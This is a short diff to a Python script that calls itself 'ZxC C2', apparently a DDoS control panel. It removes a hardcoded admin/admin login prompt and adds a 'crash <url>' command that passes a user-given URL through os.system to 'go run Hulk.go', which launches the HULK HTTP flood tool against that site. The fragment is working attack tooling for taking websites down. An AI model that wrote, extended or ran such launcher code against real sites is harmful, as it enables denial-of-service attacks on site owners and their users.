@@ -751,28 +751,8 @@ CLEAR   ► CLEAR TERMINAL
             except IndexError:
                 pass
 
-
-def login():
-    clear()
-    user = "admin"
-    passwd = "admin"
-    username = input("⚡ Username: ")
-    password = getpass.getpass(prompt='⚡ Password: ')
-    if username != user or password != passwd:
-        print("")
-        print("⚡ Haizzz, you're so cute...")
-        sys.exit(1)
-    elif username == user and password == passwd:
-        print("⚡ Welcome to ZxC C2!")
-        time.sleep(0.3)
-        ascii_vro()
-        main()
-
-#login()
-main()
-#url = cnc.split()[1]
-#method = cnc.split()[2]
-url = requests.get(sys.argv[1:])
-method = 'GET'
-print(f'{url}')
-os.system(f'go run Hulk.go -site {url} -data {method}')
+try:
+    os.system(f'go run Hulk.go -site {sys.argv[1]} -data GET')
+except IndexError:
+    print('Usage: crash <url> METHODS<GET/POST>')
+    print('Example: crash http://example.com GET')
